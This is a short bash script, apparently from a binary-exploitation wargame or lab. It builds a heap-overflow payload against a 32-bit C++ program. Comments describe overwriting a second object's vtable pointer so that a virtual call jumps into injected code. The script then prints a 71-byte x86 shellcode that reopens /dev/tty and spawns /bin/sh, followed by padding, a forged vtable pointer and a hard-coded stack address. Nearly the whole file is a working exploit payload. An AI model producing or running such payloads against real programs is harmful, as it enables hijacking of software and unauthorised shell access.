#!/bin/bash

# vptr + str + int + next_chunk_size + obj2_vptr + obj2_str + obj2_int ...
# obj2->vptr->func1
# the obj2 in heap
#       the vtable somewhere
#               - func1
#               - func2
# [obj2] = vptr
# [vptr] = func1
#
# obj2 = address in heap
# vptr = address of vtable in program's .rodata section
#       the address is equal to the address of the first function, func1

# str: 100B + int: 4B + next_chunk_size: 4B
# shellcode + padding + this+4 + shellcode address
# obj1 = 0x804a008
# obj2 = 0x804a078

SHELL_CODE="\x83\xc4\x18\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" # 71 bytes
PADDING="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" # 37 bytes
VPTR="\x7c\xa0\x04\x08" # 0x804a07c
SHELLCODE_ADDR="\x7c\xff\xff\xbf" # 0xbfffff7c a stack address

echo -e -n "$SHELL_CODE""$PADDING""$VPTR""$SHELLCODE_ADDR"